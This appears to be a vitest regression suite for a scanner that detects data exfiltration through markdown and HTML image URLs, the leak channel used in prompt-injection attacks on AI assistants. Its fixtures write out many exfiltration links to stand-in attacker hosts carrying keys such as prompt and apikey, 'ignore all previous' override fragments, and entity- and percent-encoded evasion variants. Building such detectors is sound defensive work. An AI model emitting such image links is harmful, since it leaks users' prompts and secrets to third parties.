/**
 * S4 regression: Markdown image URL exfiltration detection.
 *
 * Covers strong/weak key tiering, safeHost suffix matching, public-vs-private
 * IP literal handling, all three markdown image shapes (inline, reference,
 * HTML <img>), and the fileType gating contract (text -> 0 findings).
 *
 * Findings surface under `hiddenHtml` (no new top-level byCategory key per R13).
 */

import { describe, it, expect } from "vitest";
import { detectMarkdownExfil } from "@shield-scanner/core";
import { analyze } from "@shield-scanner/core";

describe("S4: detectMarkdownExfil — direct unit", () => {
  it("flags inline image with a strong key (prompt) as danger", () => {
    const md = `![cute cat](http://attacker.example/log?prompt=PAYLOAD)`;
    const out = detectMarkdownExfil(md);
    expect(out).toHaveLength(1);
    expect(out[0]).toMatchObject({
      element: "md-image",
      severity: "danger",
    });
    // technique is a fixed-phrase string (no attacker host / key name inside).
    // The specific matched key (e.g. "prompt") is carried in meta so UIs can
    // still show it on the detail row but it never reaches the banner label.
    expect(out[0].technique).toBe("Markdown image exfiltration (strong key)");
    expect(out[0].meta).toMatchObject({ matchedKey: "prompt" });
    // Position must point at the URL inside the markdown, not at the alt-text.
    expect(md.slice(out[0].position, out[0].position + out[0].matchLen)).toBe(
      "http://attacker.example/log?prompt=PAYLOAD"
    );
  });

  it("returns [] for a benign GitHub raw image (safeHost short-circuit)", () => {
    const md = `![logo](https://raw.githubusercontent.com/foo/bar/main/logo.png)`;
    expect(detectMarkdownExfil(md)).toEqual([]);
  });

  it("imageOnlyHosts suffix-matches subdomains (foo.raw.githubusercontent.com)", () => {
    // raw.githubusercontent.com is a Tier-1 imageOnlyHost (CDN-only). A
    // hypothetical sub-subdomain is still served by jsDelivr-style infra,
    // so suffix-match is safe here.
    const md = [
      `![a](https://raw.githubusercontent.com/foo/bar/main/logo.png?prompt=ignore)`,
      `![b](https://x.cdn.jsdelivr.net/npm/foo/dist/x.png?prompt=ignore)`,
    ].join("\n");
    expect(detectMarkdownExfil(md)).toEqual([]);
  });

  it("userContentHosts are EXACT-only — attacker.qiita.com still fires (Bug #3 fix)", () => {
    // qiita.com is a Tier-2 userContentHost: anyone can register an account
    // and host content on a subdomain. The OLD behaviour (suffix-match) would
    // have allowlisted `some.qiita.com` as safe, which is a critical FN
    // because an attacker could host a payload there. New behaviour: only
    // EXACT qiita.com matches short-circuit; subdomains still go through
    // the suspicious-key check.
    const md = `![evil](https://attacker.qiita.com/p/banner.png?prompt=ignore)`;
    const out = detectMarkdownExfil(md);
    expect(out).toHaveLength(1);
    expect(out[0].severity).toBe("danger");
  });

  it("resolves a reference image and flags the underlying URL", () => {
    const md = [
      `Here is a cat ![cute cat][catref] for you.`,
      ``,
      `[catref]: http://attacker.example/log?prompt=ignore+all+previous`,
    ].join("\n");
    const out = detectMarkdownExfil(md);
    expect(out).toHaveLength(1);
    expect(out[0]).toMatchObject({
      element: "md-image-ref",
      severity: "danger",
    });
  });

  it("flags an HTML <img src='...'> form (danger)", () => {
    const md = `<img src="https://attacker.example/p?prompt=PAYLOAD" />`;
    const out = detectMarkdownExfil(md);
    expect(out).toHaveLength(1);
    expect(out[0].element).toBe("html-img");
    expect(out[0].severity).toBe("danger");
  });

  it("ignores data: URLs", () => {
    const md = `![inline](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAUAAAAFCAYAAACNbyblAAAAHElEQVQI12P4//8/w38GIAXDIBKE0DHxgljNBAAO9TXL0Y4OHwAAAABJRU5ErkJggg==)`;
    expect(detectMarkdownExfil(md)).toEqual([]);
  });

  it("ignores mailto: / javascript: schemes", () => {
    const md = [
      `![x](mailto:foo@example.com?prompt=ignore)`,
      `![y](javascript:alert('xss?prompt=ignore'))`,
    ].join("\n");
    expect(detectMarkdownExfil(md)).toEqual([]);
  });

  it("public IP literal + suspicious key -> danger", () => {
    const md = `![evil](http://203.0.113.42/c?prompt=ignore)`;
    const out = detectMarkdownExfil(md);
    expect(out).toHaveLength(1);
    expect(out[0].severity).toBe("danger");
    expect(out[0].technique).toMatch(/public IP/);
  });

  it("private IP (192.168.x.x) + suspicious key -> warning (not danger)", () => {
    const md = `![internal](http://192.168.1.10/c?prompt=ignore)`;
    const out = detectMarkdownExfil(md);
    expect(out).toHaveLength(1);
    expect(out[0].severity).toBe("warning");
    expect(out[0].technique).toMatch(/private IP/);
  });

  it("v1.9.0: 1 weak key alone on unknown host -> warning (threshold relaxed from >=2 to >=1)", () => {
    // Pre-v1.9.0 this returned [] (weak >= 2 was required). The relax is gated
    // by the safeHost short-circuit on imageOnlyHosts / userContentHosts, so
    // legitimate CDN URLs that incidentally carry one weak key remain quiet.
    const md = `![x](http://attacker.example/p?context=hello)`;
    const out = detectMarkdownExfil(md);
    expect(out).toHaveLength(1);
    expect(out[0].severity).toBe("warning");
    expect(out[0].technique).toBe("Markdown image exfiltration (weak key)");
    expect(out[0].meta).toMatchObject({ matchedKey: "context", weakHits: 1 });
  });

  it("v1.9.0: high-FP generic 'data' is no longer in the weak set (demoted to extraGenericWeakKeys)", () => {
    // 'data' was the single noisiest weak key (benign analytics / CDN URLs
    // routinely carry it). It moved to extraGenericWeakKeys in v1.9.0 and is
    // NOT counted by the live detector — a lone `?data=...` produces nothing.
    const md = `![x](http://attacker.example/p?data=hello)`;
    expect(detectMarkdownExfil(md)).toEqual([]);
  });

  it("multiple weak keys still warn (threshold is weak>=1 since v1.9.0)", () => {
    const md = `![x](http://attacker.example/p?context=A&session=B)`;
    const out = detectMarkdownExfil(md);
    expect(out).toHaveLength(1);
    expect(out[0].severity).toBe("warning");
    expect(out[0].technique).toBe("Markdown image exfiltration (weak key)");
    expect(out[0].meta.weakHits).toBe(2);
  });

  it("Firebase storage URL with token=... stays SAFE (value contents ignored)", () => {
    // R12: never inspect value contents. Firebase signed URLs carry a
    // `token=` query parameter that would tempt a naive substring matcher;
    // we deliberately keep `token` out of both key lists.
    const md =
      `![firebase](https://firebasestorage.googleapis.com/v0/b/myapp/o/img.png?alt=media&token=abc-123-def)`;
    expect(detectMarkdownExfil(md)).toEqual([]);
  });

  it("Discord CDN signed URL with hm/ex/is parameters stays SAFE", () => {
    const md =
      `![d](https://media.discordapp.net/attachments/123/456/img.png?ex=abc&is=def&hm=xyz)`;
    expect(detectMarkdownExfil(md)).toEqual([]);
  });

  it("Bug #2: technique is a fixed phrase — attacker host/key never embedded", () => {
    // R12: priority.js#labelFor reads `technique` into the banner label.
    // Embedding attacker-controlled host or query-key names there would let
    // the attacker steer the summary surface. Verify the technique string
    // is one of a fixed set of detector-controlled phrases.
    const samples = [
      "![a](http://attacker.example/p?prompt=PAYLOAD)",
      "![b](http://attacker.example/p?context=A&session=B)",
      "![c](http://203.0.113.42/p?prompt=PAYLOAD)",
      "![d](http://192.168.1.10/p?prompt=PAYLOAD)",
    ];
    const allowed = new Set([
      "Markdown image exfiltration (strong key)",
      // v1.9.0: renamed from "weak keys" (plural) to "weak key" since the
      // threshold is now >=1, not >=2 — the label should not imply plurality.
      "Markdown image exfiltration (weak key)",
      "Markdown image exfiltration (public IP host)",
      "Markdown image exfiltration (private IP host)",
    ]);
    for (const md of samples) {
      const out = detectMarkdownExfil(md);
      expect(out.length).toBe(1);
      expect(allowed.has(out[0].technique)).toBe(true);
      // Sanity: attacker host name MUST NOT appear in technique.
      expect(out[0].technique).not.toContain("attacker.example");
      expect(out[0].technique).not.toContain("203.0.113.42");
      expect(out[0].technique).not.toContain("192.168");
      // And the matched key must NOT be embedded in technique either.
      expect(out[0].technique).not.toContain("prompt");
      expect(out[0].technique).not.toContain("context");
      expect(out[0].technique).not.toContain("session");
    }
  });
});

describe("S4: analyze() integration + fileType gating", () => {
  const attackMd = `Check this out! ![cute cat](http://attacker.example/log?prompt=ignore+all+previous&leak=true)`;

  it("fileType='markdown' surfaces the finding under hiddenHtml as danger", () => {
    const r = analyze(attackMd, { fileType: "markdown" });
    expect(r.summary.dangerCount).toBeGreaterThanOrEqual(1);
    expect(r.findings.hiddenHtml.length).toBeGreaterThanOrEqual(1);
    const exfil = r.findings.hiddenHtml.find(
      (f) => f.element === "md-image"
    );
    expect(exfil).toBeDefined();
    expect(exfil.severity).toBe("danger");
  });

  it("fileType='text' does NOT fire (gating contract)", () => {
    const r = analyze(attackMd, { fileType: "text" });
    expect(r.findings.hiddenHtml).toEqual([]);
    expect(r.summary.dangerCount).toBe(0);
  });

  it("fileType='html' fires (S4 reuses the same gating block as detectHiddenElements)", () => {
    // Even with no <img> tag, the markdown image syntax inside an HTML body
    // is still scanned (analyze() runs both detectHiddenElements + detectMarkdownExfil
    // when fileType is in HIDDEN_ELEMENT_FILETYPES).
    const r = analyze(attackMd, { fileType: "html" });
    expect(r.findings.hiddenHtml.some((f) => f.element === "md-image")).toBe(
      true
    );
  });

  it("byCategory shape is unchanged (no new top-level keys per R13)", () => {
    const r = analyze("Hello", { fileType: "markdown" });
    expect(Object.keys(r.summary.byCategory).sort()).toEqual(
      [
        "controlChars",
        "hiddenHtml",
        "homoglyphs",
        "invisibleUnicode",
        "suspiciousPatterns",
      ].sort()
    );
  });
});

// ---------------------------------------------------------------------------
// v1.9.0: host-tier asymmetry + weak>=1 threshold relax.
// ---------------------------------------------------------------------------
describe("S4 v1.9.0: host-tier asymmetry", () => {
  it("userContent subdomain (attacker.notion.so) + 1 weak key -> warning", () => {
    // notion.so is in userContentHosts (EXACT match). `attacker.notion.so` is
    // a subdomain, falls through to unknown-host path. weak>=1 -> warning.
    const md = `![n](https://attacker.notion.so/page/img.png?session=abc)`;
    const out = detectMarkdownExfil(md);
    expect(out).toHaveLength(1);
    expect(out[0].severity).toBe("warning");
    expect(out[0].technique).toBe("Markdown image exfiltration (weak key)");
  });

  it("imageOnly host (i.imgur.com) + 1 weak key -> still safe (suffix-match short-circuit)", () => {
    // i.imgur.com is a Tier-1 imageOnlyHost — strong OR weak doesn't matter,
    // safeHost short-circuits before any key counting. This is the safety
    // net for the weak>=1 relax: legit CDN URLs with noisy keys stay quiet.
    const md = `![i](https://i.imgur.com/abc.png?session=preview)`;
    expect(detectMarkdownExfil(md)).toEqual([]);
  });

  it("imageOnly host + many weak keys -> still safe (short-circuit is unconditional)", () => {
    const md = `![i](https://i.imgur.com/abc.png?session=A&chat=B&context=C&payload=D)`;
    expect(detectMarkdownExfil(md)).toEqual([]);
  });

  it("public IP + 1 weak key -> warning (was danger pre-v1.9.0)", () => {
    // Pre-v1.9.0: any suspicious key on public IP -> danger. v1.9.0 splits:
    // weak alone -> warning, strong -> danger.
    const md = `![x](http://203.0.113.42/c?session=abc)`;
    const out = detectMarkdownExfil(md);
    expect(out).toHaveLength(1);
    expect(out[0].severity).toBe("warning");
    expect(out[0].technique).toBe("Markdown image exfiltration (public IP host)");
    expect(out[0].meta).toMatchObject({ ipKind: "public", matchedKey: "session" });
  });

  it("public IP + strong key still -> danger", () => {
    const md = `![x](http://203.0.113.42/c?prompt=ignore)`;
    const out = detectMarkdownExfil(md);
    expect(out).toHaveLength(1);
    expect(out[0].severity).toBe("danger");
    expect(out[0].technique).toBe("Markdown image exfiltration (public IP host)");
  });

  it("private IP + 1 weak key -> silent (was warning pre-v1.9.0)", () => {
    // Lone weak key on private/loopback space is too noisy (dev/staging
    // webhooks routinely carry ?session=, ?context= etc).
    const md = `![x](http://192.168.1.10/c?session=abc)`;
    expect(detectMarkdownExfil(md)).toEqual([]);
  });

  it("private IP + strong key still -> warning (not silent)", () => {
    const md = `![x](http://192.168.1.10/c?prompt=ignore)`;
    const out = detectMarkdownExfil(md);
    expect(out).toHaveLength(1);
    expect(out[0].severity).toBe("warning");
    expect(out[0].technique).toBe("Markdown image exfiltration (private IP host)");
  });

  it("loopback ::1 + 1 weak key -> silent (mirrors IPv4 private)", () => {
    const md = `![x](http://[::1]/c?session=abc)`;
    expect(detectMarkdownExfil(md)).toEqual([]);
  });

  it("loopback 127.0.0.1 + 1 weak key -> silent", () => {
    const md = `![x](http://127.0.0.1/c?session=abc)`;
    expect(detectMarkdownExfil(md)).toEqual([]);
  });

  it("R12: meta.matchedKey carries the key name, technique stays fixed-phrase", () => {
    // priority.js#labelFor reads pattern/name/technique/type/kind only.
    // meta.* never reaches the banner label — verify by direct inspection.
    const md = `![x](http://attacker.example/c?session=PAYLOAD-STR)`;
    const out = detectMarkdownExfil(md);
    expect(out).toHaveLength(1);
    expect(out[0].technique).not.toContain("session");
    expect(out[0].technique).not.toContain("PAYLOAD-STR");
    expect(out[0].meta.matchedKey).toBe("session");
  });

  it("R12: meta.host carries the attacker hostname, technique never echoes it", () => {
    const md = `![x](http://evil.example.org/c?context=hello)`;
    const out = detectMarkdownExfil(md);
    expect(out).toHaveLength(1);
    expect(out[0].technique).not.toContain("evil.example.org");
    expect(out[0].meta.host).toBe("evil.example.org");
  });

  it("v1.10.0 Theme A smoke: 3-path parity — same URL same verdict (inline/ref/html-img)", () => {
    // Single smoke pin at the MCP layer; full matrix lives in
    // packages/core/test/md-exfil-threshold.test.js so we don't duplicate
    // coverage. This confirms the regression suite still observes parity
    // through the same classifyUrl() pipeline when invoked from MCP-side.
    const url = "http://attacker.example/?prompt=PAYLOAD";
    const inlineFs = detectMarkdownExfil(`![alt](${url})`);
    const refFs = detectMarkdownExfil(`![alt][r]\n\n[r]: ${url}`);
    const htmlFs = detectMarkdownExfil(`<img src="${url}" />`);
    expect(inlineFs).toHaveLength(1);
    expect(refFs).toHaveLength(1);
    expect(htmlFs).toHaveLength(1);
    for (const f of [inlineFs[0], refFs[0], htmlFs[0]]) {
      expect(f.severity).toBe("danger");
      expect(f.technique).toBe("Markdown image exfiltration (strong key)");
      expect(f.meta.host).toBe("attacker.example");
      expect(f.meta.matchedKey).toBe("prompt");
    }
  });
});

// ---------------------------------------------------------------------------
// v1.11.0 Theme B: HTML <img> + reference-image coverage expansion.
// classifyUrl() is shared, so these tests focus on the SHAPE-extraction layer
// (regex group selection, position offset, case-insensitivity, edge inputs)
// rather than re-litigating the host-tier matrix.
// ---------------------------------------------------------------------------
describe("S4 v1.11.0: HTML <img> shape coverage", () => {
  it("double-quoted src extracts URL + slice contract holds", () => {
    const url = "http://attacker.example/p?prompt=PAYLOAD";
    const md = `<img src="${url}" alt="x">`;
    const out = detectMarkdownExfil(md);
    expect(out).toHaveLength(1);
    expect(out[0].element).toBe("html-img");
    expect(out[0].severity).toBe("danger");
    // slice(position, position+matchLen) must equal the URL (no surrounding quote).
    expect(md.slice(out[0].position, out[0].position + out[0].matchLen)).toBe(url);
  });

  it("single-quoted src extracts URL (RE group 2 path)", () => {
    const url = "http://attacker.example/p?prompt=PAYLOAD";
    const md = `<img src='${url}' alt='x'>`;
    const out = detectMarkdownExfil(md);
    expect(out).toHaveLength(1);
    expect(out[0].element).toBe("html-img");
    expect(out[0].severity).toBe("danger");
    expect(md.slice(out[0].position, out[0].position + out[0].matchLen)).toBe(url);
  });

  it("bare src=url (no quotes) extracts URL (RE group 3 path)", () => {
    const url = "http://attacker.example/p?prompt=PAYLOAD";
    const md = `<img src=${url} alt=x>`;
    const out = detectMarkdownExfil(md);
    expect(out).toHaveLength(1);
    expect(out[0].element).toBe("html-img");
    expect(out[0].severity).toBe("danger");
    expect(md.slice(out[0].position, out[0].position + out[0].matchLen)).toBe(url);
  });

  it("case-insensitive tag/attr: <IMG SRC=...> still matches (gi flag)", () => {
    const url = "http://attacker.example/p?prompt=PAYLOAD";
    const md = `<IMG SRC="${url}" ALT="x">`;
    const out = detectMarkdownExfil(md);
    expect(out).toHaveLength(1);
    expect(out[0].element).toBe("html-img");
  });

  it("extra attributes around src do not break extraction", () => {
    const url = "http://attacker.example/p?prompt=PAYLOAD";
    // width before src, loading=lazy after src — RE must still anchor on src=.
    const md = `<img width="600" height="400" src="${url}" loading="lazy" decoding="async">`;
    const out = detectMarkdownExfil(md);
    expect(out).toHaveLength(1);
    expect(out[0].element).toBe("html-img");
    expect(md.slice(out[0].position, out[0].position + out[0].matchLen)).toBe(url);
  });

  it("malformed <img> with no src does not produce a finding", () => {
    // No src= attribute at all -> the regex's src group cannot match.
    const md = `<img alt="x" width="600">`;
    expect(detectMarkdownExfil(md)).toEqual([]);
  });
});

describe("S4 v1.11.0: reference-image shape coverage", () => {
  it("safe-host ref-image (raw.githubusercontent.com) short-circuits to []", () => {
    const md = [
      `![logo][gh]`,
      ``,
      `[gh]: https://raw.githubusercontent.com/foo/bar/main/logo.png`,
    ].join("\n");
    expect(detectMarkdownExfil(md)).toEqual([]);
  });

  it("unknown-host ref-image + strong key -> danger via md-image-ref", () => {
    const md = [
      `See ![spec][s] for details.`,
      ``,
      `[s]: http://attacker.example/sink?apikey=STEAL`,
    ].join("\n");
    const out = detectMarkdownExfil(md);
    expect(out).toHaveLength(1);
    expect(out[0].element).toBe("md-image-ref");
    expect(out[0].severity).toBe("danger");
    expect(out[0].meta.matchedKey).toBe("apikey");
  });

  it("weak-key ref-image on unknown host -> warning (mirrors inline weak>=1)", () => {
    const md = [
      `Logo: ![logo][r]`,
      ``,
      `[r]: http://attacker.example/p?context=hello`,
    ].join("\n");
    const out = detectMarkdownExfil(md);
    expect(out).toHaveLength(1);
    expect(out[0].element).toBe("md-image-ref");
    expect(out[0].severity).toBe("warning");
    expect(out[0].technique).toBe("Markdown image exfiltration (weak key)");
  });

  it("ref-id is case-insensitive (![alt][CatRef] -> [catref]: url)", () => {
    const md = [
      `![cat][CatRef]`,
      ``,
      `[catref]: http://attacker.example/log?prompt=PAYLOAD`,
    ].join("\n");
    const out = detectMarkdownExfil(md);
    expect(out).toHaveLength(1);
    expect(out[0].element).toBe("md-image-ref");
    expect(out[0].severity).toBe("danger");
  });

  it("ref-image with missing definition produces no finding", () => {
    // ![alt][nope] but [nope]: ... is not defined anywhere.
    const md = `![cat][nope]`;
    expect(detectMarkdownExfil(md)).toEqual([]);
  });

  it("ref-image position points at the URL inside the DEFINITION line (not the use-site)", () => {
    // Contract: slice(position, position+matchLen) === url. The use-site
    // ![alt][id] has length != url.length so anchoring there would violate
    // the bracket invariant.
    const url = "http://attacker.example/p?prompt=PAYLOAD";
    const md = [
      `intro ![alt][r] outro`,
      ``,
      `[r]: ${url}`,
    ].join("\n");
    const out = detectMarkdownExfil(md);
    expect(out).toHaveLength(1);
    expect(md.slice(out[0].position, out[0].position + out[0].matchLen)).toBe(url);
  });
});

describe("S4 v1.13.0: HTML <img> entity-decoded src", () => {
  it("entity-encoded quote-wrapped src surfaces under hiddenHtml with entityDecoded=true", () => {
    // v1.12.0 left this case silent and pinned the silence as a negative
    // test. v1.13.0 flips the html-img path to entity-decode the captured
    // src before classifyUrl(), so the previously-undetected exfil URL
    // now surfaces. Smoke at MCP layer (analyze + fileType=html) — full
    // coverage lives in packages/core/test/md-exfil-threshold.test.js.
    const md = `<img src=&quot;http://attacker.example/p?prompt=PAYLOAD&quot;>`;
    const r = analyze(md, { fileType: "html" });
    expect(r.summary.dangerCount).toBeGreaterThanOrEqual(1);
    const exfil = r.findings.hiddenHtml.find(
      (f) => f.element === "html-img" && f.meta && f.meta.entityDecoded
    );
    expect(exfil).toBeDefined();
    expect(exfil.severity).toBe("danger");
    expect(exfil.technique).toBe("Markdown image exfiltration (strong key)");
    expect(exfil.meta).toMatchObject({
      host: "attacker.example",
      matchedKey: "prompt",
      entityDecoded: true,
    });
  });
});

describe("S4 v1.11.0: mixed inline + html-img + ref-image in one document", () => {
  it("a single document with all 3 shapes produces 3 findings (one per shape)", () => {
    const md = [
      `![inline](http://attacker.example/p?prompt=A)`,
      `<img src="http://attacker.example/p?prompt=B" alt="html">`,
      `![ref][r]`,
      ``,
      `[r]: http://attacker.example/p?prompt=C`,
    ].join("\n");
    const out = detectMarkdownExfil(md);
    expect(out).toHaveLength(3);
    const elementSet = new Set(out.map((f) => f.element));
    expect(elementSet).toEqual(new Set(["md-image", "html-img", "md-image-ref"]));
    // All three fire as danger via strong-key path.
    for (const f of out) {
      expect(f.severity).toBe("danger");
      expect(f.technique).toBe("Markdown image exfiltration (strong key)");
    }
  });
});

// ---------------------------------------------------------------------------
// v1.15.0 Theme B: percent-decoded URL pre-pass.
//
// classifyUrl() now runs a minimal percent-decode 2-pass over the URL when
// raw classification misses. Smoke at MCP layer (analyze + fileType=markdown
// / html). Full coverage lives in packages/core/test/md-exfil-threshold.test.js.
// ---------------------------------------------------------------------------
describe("S4 v1.15.0: percent-decoded URL pre-pass", () => {
  it("inline image with %26-encoded strong key surfaces under hiddenHtml with percentDecoded=true", () => {
    // `?a=A%26prompt=B` raw: searchParams sees key "a" with value
    // "A&prompt=B" -> off-list -> raw miss. Percent-decode: `%26`->`&`
    // -> searchParams sees `a` + `prompt` -> 1 strong -> danger. The
    // analyze() pipeline routes this through hiddenHtml (md-exfil's
    // existing bucket).
    const md = `![x](http://attacker.example/p?a=A%26prompt=PAYLOAD)`;
    const r = analyze(md, { fileType: "markdown" });
    expect(r.summary.dangerCount).toBeGreaterThanOrEqual(1);
    const exfil = r.findings.hiddenHtml.find(
      (f) => f.element === "md-image" && f.meta && f.meta.percentDecoded
    );
    expect(exfil).toBeDefined();
    expect(exfil.severity).toBe("danger");
    expect(exfil.technique).toBe("Markdown image exfiltration (strong key)");
    expect(exfil.meta).toMatchObject({
      host: "attacker.example",
      matchedKey: "prompt",
      percentDecoded: true,
    });
  });

  it("safe-host short-circuit still wins on the percent-decoded form (i.imgur.com)", () => {
    // Critical safety net: classifyUrlImpl runs isSafeHost() BEFORE
    // classifyQueryKeys(), and the hostname is identical raw vs decoded.
    // Even with %26-encoded strong keys post-decode, i.imgur.com silences.
    const md = `![x](https://i.imgur.com/abc.png?a=A%26prompt=PAYLOAD)`;
    const r = analyze(md, { fileType: "markdown" });
    const exfil = r.findings.hiddenHtml.filter((f) => f.element === "md-image");
    expect(exfil).toEqual([]);
  });

  it("html-img with combined entity + percent encoding -> BOTH entityDecoded AND percentDecoded flags", () => {
    // Double-obfuscation: `&quot;…%26…&quot;`. html-img raw classify misses
    // (entity-encoded protocol); entity-decoded form passes through
    // classifyUrl() which runs the percent-decode 2-pass. Final meta has
    // both flags. This pins the composability contract.
    const md = `<img src=&quot;http://attacker.example/p?a=A%26prompt=PAYLOAD&quot;>`;
    const r = analyze(md, { fileType: "html" });
    expect(r.summary.dangerCount).toBeGreaterThanOrEqual(1);
    const exfil = r.findings.hiddenHtml.find(
      (f) =>
        f.element === "html-img" &&
        f.meta &&
        f.meta.entityDecoded === true &&
        f.meta.percentDecoded === true
    );
    expect(exfil).toBeDefined();
    expect(exfil.severity).toBe("danger");
    expect(exfil.technique).toBe("Markdown image exfiltration (strong key)");
    expect(exfil.meta).toMatchObject({
      host: "attacker.example",
      matchedKey: "prompt",
      entityDecoded: true,
      percentDecoded: true,
    });
  });

  it("R12: technique stays fixed-phrase on percent-decoded path (no decoded URL leak)", () => {
    // priority.js#labelFor reads `technique` into the banner label. The
    // percent-decode pre-pass output (decoded URL string) must NEVER appear
    // in technique. Pin the allowed phrase set at the MCP layer too.
    const md = `![x](http://evil-mcp-pct.example/c?a=A%26prompt=PAYLOAD-LEAK)`;
    const r = analyze(md, { fileType: "markdown" });
    const exfil = r.findings.hiddenHtml.find(
      (f) => f.element === "md-image" && f.meta && f.meta.percentDecoded
    );
    expect(exfil).toBeDefined();
    const allowed = new Set([
      "Markdown image exfiltration (strong key)",
      "Markdown image exfiltration (weak key)",
      "Markdown image exfiltration (public IP host)",
      "Markdown image exfiltration (private IP host)",
    ]);
    expect(allowed.has(exfil.technique)).toBe(true);
    expect(exfil.technique).not.toContain("evil-mcp-pct.example");
    expect(exfil.technique).not.toContain("PAYLOAD-LEAK");
    expect(exfil.technique).not.toContain("prompt");
    expect(exfil.technique).not.toContain("%26");
    // R13: content echoes the RAW (still-encoded) URL.
    expect(exfil.content).toContain("%26");
    expect(exfil.content).not.toContain("a=A&prompt");
  });
});
